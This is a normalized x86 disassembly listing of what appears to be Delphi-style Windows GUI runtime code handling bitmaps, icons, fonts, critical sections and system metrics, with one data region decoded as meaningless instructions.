mov eax [ esi + 0x28 ]
mov ebx [ eax + 0x6c ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
jmp r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4160e0
cmp [ esp ] 0x0
je r-xdata
mov edx esp
mov ecx 0x4
mov eax edi
call sub_4160e0
mov eax [ esp + 0x8 ]
add eax 0xe
add [ esp ] eax
lea eax [ esp + 0x10 ]
xor ecx ecx
mov edx 0xe
call sub_402cbc
mov [ esp + 0x10 ] 0x4d42
mov eax esi
call sub_422678
mov dl [ r-xdata ]
call sub_41e5b8
mov eax [ ebp + 0x14 ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
call sub_41e8dc
mov [ esp + 0xc ] eax
lea eax [ esp + 0x2a ]
push eax
push 0x100
push 0x0
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call GetDIBColorTable
mov [ esp + 0x4 ] eax
mov eax [ esp + 0xc ]
push eax
mov eax [ esi + 0x2c ]
mov eax [ eax + 0x4 ]
push eax
call SelectObject
mov eax [ ebp + 0x50 ]
test eax eax
jbe r-xdata
mov [ esp + 0x8 ] 0xc
mov ax [ ebp + 0x3e ]
cmp ax 0x8
ja r-xdata
add esp 0x42c
pop ebp
pop edi
pop esi
pop ebx
retn
lea eax [ ebp + 0x18 ]
call sub_421790
cmp [ esp + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x70 ] 0x0
jne r-xdata
cmp eax [ esp + 0x4 ]
jae r-xdata
mov ecx eax
mov eax 0x1
shl eax cl
lea eax [ eax + eax * 2 ]
add [ esp + 0x8 ] eax
cmp [ ebp + 0x70 ] 0x0
je r-xdata
mov eax [ ebp + 0x50 ]
test eax eax
je r-xdata
mov eax [ esp ]
mov [ esp + 0x12 ] eax
mov eax [ esp + 0x8 ]
add eax 0xe
mov [ esp + 0x1a ] eax
cmp [ esp + 0x4 ] 0x0
jne r-xdata
mov [ esp + 0x4 ] eax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4160e0
lea edx [ ebp + 0x30 ]
mov ecx 0x28
mov eax edi
call sub_4160e0
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
lea eax [ ebp + 0x30 ]
mov [ esp + 0x1e ] 0xc
mov dx [ eax + 0x4 ]
mov [ esp + 0x22 ] dx
mov dx [ eax + 0x8 ]
mov [ esp + 0x24 ] dx
mov [ esp + 0x26 ] 0x1
mov ax [ eax + 0xe ]
mov [ esp + 0x28 ] ax
lea edx [ esp + 0x10 ]
mov ecx 0xe
mov eax edi
call sub_4160e0
lea edx [ esp + 0x1e ]
mov ecx 0xc
mov eax edi
call sub_4160e0
jmp r-xdata
mov eax [ esp + 0x4 ]
mov [ ebp + 0x50 ] eax
cmp eax [ esp + 0x4 ]
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
xor eax eax
mov al [ ebp + 0x70 ]
xor ecx ecx
mov cl [ eax + rw-data ]
imul ecx [ esp + 0x4 ]
lea edx [ esp + 0x2a ]
mov eax edi
call sub_4160e0
mov edx [ ebp + 0x2c ]
mov ecx [ ebp + 0x44 ]
mov eax edi
call sub_4160e0
test [ ebp + 0x40 ] 0x3
je r-xdata
lea edx [ esp + 0x4 ]
lea eax [ esp + 0x2a ]
call sub_41ed4c
cmp [ ebp + 0x70 ] 0x0
je r-xdata
cmp [ ebp + 0x71 ] 0x0
jne r-xdata
lea edx [ ebp + 0x58 ]
mov ecx 0xc
mov eax edi
call sub_4160e0
lea edx [ esp + 0x2a ]
mov ecx 0xff
mov eax [ ebp + 0x10 ]
call sub_41f070
mov [ esp + 0x4 ] eax
cmp [ ebp + 0x3e ] 0x8
jbe r-xdata
mov eax [ esp + 0x4 ]
shl eax 0x2
add [ esp ] eax
add [ esp + 0x8 ] eax
sub_4238a8
push ebp
mov ebp esp
add esp 0xffffffa8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx eax
mov [ edx ] 0x2
mov eax ebx
call sub_422838
mov esi [ ebx + 0x28 ]
push esi
add esi 0x18
lea edi [ ebp - 0x58 ]
mov ecx 0x15
[ edi ] [ esi ]
pop esi
xor eax eax
mov [ ebp - 0x40 ] eax
xor eax eax
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x58 ]
push eax
mov eax [ ebx + 0x2c ]
push eax
mov edi [ esi + 0x10 ]
mov ecx edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_4217dc
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
xor eax eax
push ebp
push sub_423922
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x28 ]
mov eax [ eax + 0x10 ]
call sub_421e40
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_423948
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0xc ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_423990
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_41fa5c
mov [ edi + 0x21 ] 0x1
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov esi eax
mov [ edi + 0x28 ] esi
mov eax esi
call sub_421608
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4239e4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x28 ]
call sub_42160c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414408
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_423a14
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
xor ecx ecx
xor edx edx
mov eax esi
call sub_423cec
mov edi ebx
mov eax [ edi + 0x28 ]
call sub_421608
mov eax [ esi + 0x28 ]
call sub_42160c
mov eax [ edi + 0x28 ]
mov [ esi + 0x28 ] eax
jmp r-xdata
mov edx ebx
mov eax esi
call sub_414434
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x10 ]
jmp r-xdata
sub_423a74
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl [ r-xdata ]
mov eax esi
call sub_41e5b8
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_423acc
push eax
mov eax [ edi + 0x4 ]
push eax
mov eax [ edi ]
push eax
mov eax [ esi + 0x4 ]
push eax
call DrawIconEx
pop edi
pop esi
pop ebx
retn
sub_423b08
push ebx
push esi
add esp 0xfffffff4
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
add esp 0xc
pop esi
pop ebx
retn
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
push 0x0
push 0x0
call sub_415e9c
mov edx esp
mov ecx 0x6
mov eax [ ebx + 0xc ]
call sub_4160a8
mov ax [ esp + 0x2 ]
sub ax 0x1
jb r-xdata
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
jmp r-xdata
je r-xdata
mov eax [ esp + 0x8 ]
mov [ ebx + 0x8 ] eax
push 0x6
lea eax [ esi + 0x2c ]
push eax
lea eax [ ebx + 0x10 ]
push eax
movzx ecx [ esp + 0x10 ]
lea edx [ esp + 0x14 ]
mov eax [ ebx + 0xc ]
call sub_41f31c
jmp r-xdata
jmp r-xdata
call sub_41e7c8
sub_423b80
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi eax
mov ebx [ esi + 0x28 ]
cmp [ ebx + 0xc ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423c0d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_423acc
cmp eax [ rw-data ]
jne r-xdata
call sub_41e7c8
mov eax esi
call sub_423acc
mov edx eax
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_41f860
lea eax [ ebp - 0xa ]
xor ecx ecx
mov edx 0x6
call sub_402cbc
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4160e0
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_423c34
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423cc2
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
mov edx [ eax ]
call [ edx ]
push eax
mov eax esi
call sub_415e7c
pop edx
sub edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax esi
call sub_4160a8
lea edx [ ebp - 0xa ]
mov ecx 0x6
mov eax [ ebp - 0x4 ]
call sub_4160a8
mov ax [ ebp - 0x8 ]
sub ax 0x2
jb r-xdata
mov ecx [ ebp - 0x4 ]
xor edx edx
mov eax ebx
call sub_423cec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
call sub_41e7c8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423cc7
mov eax [ ebp - 0x4 ]
call sub_4032a0
call sub_403a54
call sub_403aa8
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_423cec
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_423d2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x8 ] esi
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_421608
mov eax [ ebx + 0x28 ]
call sub_42160c
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x28 ] eax
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_423dac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_423b80
mov eax [ ebx + 0x28 ]
mov ebx [ eax + 0xc ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax esi
call sub_4160e0
pop esi
pop ebx
retn
sub_423dfc
push ebx
push 0x0
call GetDC
mov ebx eax
push 0x5a
push ebx
call GetDeviceCaps
mov [ rw-data ] eax
push ebx
push 0x0
call ReleaseDC
mov eax rw-data
mov edx 0xf
call sub_41ee1c
mov [ rw-data ] eax
pop ebx
retn
sub_423e34
push ebx
push esi
add esp 0xffffffc8
mov bl 0x1
push 0x0
call GetDC
mov esi eax
test esi esi
je r-xdata
mov eax ebx
add esp 0x38
pop esi
pop ebx
retn
mov eax [ rw-data ]
push eax
push esi
call SelectObject
test eax eax
je r-xdata
push esi
push 0x0
call ReleaseDC
push esp
push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_423e78
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call sub_4061f4
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_423e34
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call sub_4061f4
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_423f44
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_423f7c
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax esi
call sub_424174
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_423fc0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_423fa8
xor eax eax
push ebp
push sub_424061
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424068
mov eax [ ebp - 0x4 ]
call sub_423fb4
retn
mov eax 0x10
call sub_4026cc
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_424074
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_424074
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_4220b0
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_424153
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_422678
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_41dd08
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_41dbec
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_4129b0
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_41dfc4
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_41e478
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_422334
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_424174
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423fa8
xor eax eax
push ebp
push sub_4241bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241c6
mov eax [ ebp - 0x4 ]
call sub_423fb4
retn
mov esp ebp
pop ebp
retn
sub_4241c6
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_4026ec
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_4032a0
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_423fa8
xor eax eax
push ebp
push sub_4241bf
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241c6
mov eax [ ebp - 0x4 ]
call sub_423fb4
retn
mov esp ebp
pop ebp
retn
sub_4241ec
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_41cf40
push eax
mov eax ebx
call sub_41cf40
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_423fc0
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_424224
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4242ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4242f4
retn
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
call sub_4212ec
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
call sub_4032a0
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404afc
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404afc
sub_4242f8
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_423dfc
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_423e78
mov cx 0x2c
mov dl 0x1
mov eax [ sub_41c684 ]
call sub_41c6f8
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41c684 ]
call sub_41c6f8
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_41c684 ]
call sub_41c6f8
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_423f44
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41408c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_41408c
mov [ rw-data ] eax
mov ecx sub_41cf50
mov edx sub_41cf60
mov eax [ sub_41b768 ]
call sub_4137ac
mov ecx r-xdata
mov edx sub_41d168
mov eax [ r-xdata ]
call sub_4137ac
sub_424404
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424429
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424430
retn
sub_4244a8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0x42 ] al
add [ eax ] bl
add [ eax ] al
add [ esp + eax * 2 ] bh
inc edx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
les eax [ edi + 0x42 ]
add [ esi + edi ] cl
inc ecx
add [ eax + ecx * 2 ] ch
inc edx
add [ esp + edi + 0x3d380041 ] bh
inc ecx
add [ esi ] cl
push esp
inc ebx
outsd
insd
jo r-xdata
inc eax
add ah al
outsb
outsb
je r-xdata
ror [ ebx - 0x13cd173a ] cl
std
dec [ eax - 0x3974efa2 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
clc
dec eax
inc edx
add [ eax + 0x3c00402a ] ch
dec ecx
inc edx
add [ eax ] ch
dec ecx
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
imul esi [ ebx + 0x74 ] 0x42455c90
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x45 ] ch
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax - 0x17ffbff0 ] ah
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
push esp
push ebx
je r-xdata
jb r-xdata
inc ebp
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
inc ebp
inc edx
add [ eax ] cl
add [ eax ] al
add [ eax ] dl
inc ebp
inc edx
add al ch
xor al 0x40
add ah dh
xor al 0x40
add al bh
xor al 0x40
add ah bh
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
clc
dec eax
inc edx
add [ ecx + ecx * 2 + 0x42 ] bl
add [ ecx + ecx * 2 ] bh
inc edx
add [ eax ] ch
dec ecx
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0xc400408d
sub_4245e0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_42461c
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov [ esi + 0x10 ] bl
mov eax esi
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_424698
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_414088
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_4032a0
sub_4247c4
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_413c68
mov eax [ esi + 0x14 ]
call sub_4032a0
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42482c
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
cmp [ edi + 0x14 ] 0x0
jne r-xdata
mov eax ebx
sub al 0x1
jb r-xdata
xor ecx ecx
mov dl 0x1
mov eax [ r-xdata ]
call sub_41a0e4
mov ebp eax
mov [ edi + 0x14 ] ebp
mov [ ebp + 0x34 ] edi
mov [ ebp + 0x30 ] sub_42481c
test esi esi
je r-xdata
sub al 0x2
jb r-xdata
mov ecx ebx
mov edx esi
mov eax edi
call sub_424698
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ edi + 0x14 ]
mov eax esi
call sub_41a1b4
jmp r-xdata
test esi esi
je r-xdata
jmp r-xdata
mov edx [ edi + 0x14 ]
mov eax esi
call sub_41a3e4
sub_4248b4
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_4248f8
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_4032a0
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403290
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_42493c
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_413cd4
mov eax esi
pop esi
pop ebx
retn
sub_424968
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42498d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424994
retn
sub_424a64
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424a89
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a90
retn
sub_424a9c
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404524
xor eax eax
push ebp
push sub_424b5b
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b62
lea eax [ ebp - 0x4 ]
call sub_404074
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404534
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_424a9c
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404074
sub_424b84
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_424a9c
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_424c0c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
